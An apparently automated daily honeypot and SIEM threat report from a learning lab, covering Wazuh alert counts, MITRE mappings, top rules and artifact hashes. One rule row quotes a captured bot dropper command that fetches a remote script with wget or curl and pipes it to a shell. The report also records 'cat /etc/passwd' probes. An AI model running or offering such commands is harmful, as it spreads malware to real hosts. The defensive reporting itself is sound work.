# LearningLab01 Daily Threat Intelligence Report — 2026-09-10

Generated: 2026-09-10T13:15:05.054Z

Report window: 2026-09-09T13:15:05.024Z through 2026-09-10T13:15:05.024Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 83,953 |
| Attack-related alerts | 12,702 |
| Honeypot interactions | 78,486 |
| Authentication failures | 1,938 |
| Authentication successes | 357 |
| Critical alerts | 25 |
| High alerts | 216 |
| T-Pot artifacts observed | 2 |
| Malicious artifact detections | 0 |

### Notable Observations

- 25 critical-severity alerts require priority review.
- 216 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 5.43:1.
- Country attribution currently covers only 6.02% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (48,044 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 25 | 0.03% |
| High | 216 | 0.26% |
| Medium | 1,090 | 1.30% |
| Low | 82,622 | 98.41% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 1,938
- Authentication successes: 357
- Failure-to-success ratio: 5.43:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,847 | 77.52% |
| Payload delivery | 9,847 | 77.52% |
| Authentication failure | 1,938 | 15.26% |
| Reconnaissance | 417 | 3.28% |
| Command execution | 243 | 1.91% |
| Network scan | 148 | 1.17% |
| SMTP attack | 110 | 0.87% |
| Malware | 58 | 0.46% |
| Web attack | 47 | 0.37% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 5,054 alerts, representing 6.02% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 78,899 | 93.98% | Not geolocated |
| New Zealand | 2,540 | 3.03% | ████████████████████ |
| United States | 2,226 | 2.65% | ██████████████████ |
| United Kingdom | 212 | 0.25% | ██ |
| Turkey | 20 | 0.02% | █ |
| Singapore | 13 | 0.02% | █ |
| Hungary | 12 | 0.01% | █ |
| Bulgaria | 9 | 0.01% | █ |
| Russia | 6 | 0.01% | █ |
| Germany | 5 | 0.01% | █ |
| Romania | 5 | 0.01% | █ |
| China | 2 | 0.00% | █ |
| Mongolia | 2 | 0.00% | █ |
| South Africa | 2 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 313 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Execution | 52 |
| Credential Access | 41 |
| Command and Control | 26 |
| Impact | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 52 |
| Brute Force | 41 |
| Ingress Tool Transfer | 26 |
| Exploit Public-Facing Application | 22 |
| Stored Data Manipulation | 11 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 48,044 | T-Pot RDP connection from [IP address] to port 3389. | tpot (48,044) |
| 110205 | 6 | 9,774 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,774) |
| 110207 | 5 | 7,240 | T-Pot SentryPeer SIP activity from [IP address]:54965, method INVITE | tpot (7,240) |
| 110204 | 4 | 6,974 | T-Pot Honeytrap connection from [IP address] to port 20443 | tpot (6,974) |
| 110219 | 4 | 4,841 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (4,841) |
| 110101 | 3 | 2,313 | Cowrie SSH connection from [IP address]. | tpot (2,313) |
| 110102 | 5 | 1,938 | Cowrie failed login from [IP address] using username ljd. | tpot (1,938) |
| 110201 | 4 | 586 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (586) |
| 110216 | 4 | 256 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (256) |
| 533 | 7 | 241 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240), wazuh (1) |
| 110104 | 7 | 206 | Cowrie captured a command from [IP address]: linuxshell | tpot (206) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 174 | PAM: Login session closed. | tpot (173), wazuh (1) |
| 110214 | 9 | 146 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (146) |
| 110221 | 7 | 134 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (134) |
| 110217 | 7 | 110 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (110) |
| 110209 | 5 | 101 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (101) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110220 | 8 | 79 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (79) |
| 110212 | 10 | 73 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (73) |
| 110103 | 10 | 66 | Cowrie accepted login from [IP address] using username user. | tpot (66) |
| 510 | 7 | 61 | Host-based anomaly detection event (rootcheck). | wazuh (60), tpot (1) |
| 110223 | 5 | 47 | T-Pot HoneyAML received  request from  to  on port . | tpot (47) |
| 110106 | 10 | 41 | Cowrie detected repeated failed logins from [IP address]. | tpot (41) |
| 2904 | 7 | 40 | Dpkg (Debian Package) half configured. | wazuh (40) |
| 110215 | 4 | 32 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (32) |
| 110108 | 12 | 30 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (30) |
| 110208 | 7 | 24 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:34229 | tpot (24) |
| 110225 | 13 | 22 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (22) |
| 2902 | 7 | 22 | New dpkg (Debian Package) installed. | wazuh (22) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 202 | 7 | 5 | Agent event queue is 90% full. | tpot (5) |
| 203 | 9 | 5 | Agent event queue is full. Events may be lost. | tpot (5) |
| 205 | 3 | 5 | Agent event queue is back to normal load. | tpot (5) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (4) |
| 110109 | 13 | 3 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cat /etc/passwd | tpot (3) |
| 110105 | 12 | 2 | Cowrie captured a file download from [IP address]. | tpot (2) |
| 110211 | 9 | 2 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 502 | 3 | 1 | Wazuh server started. | wazuh (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 2
- Known hashes: 2
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca | 405 | known | 0 | 0 | 60 | [Open](https://www.virustotal.com/gui/file/0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca) |
| ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e | 55 | known | 0 | 0 | 60 | [Open](https://www.virustotal.com/gui/file/ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e) |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
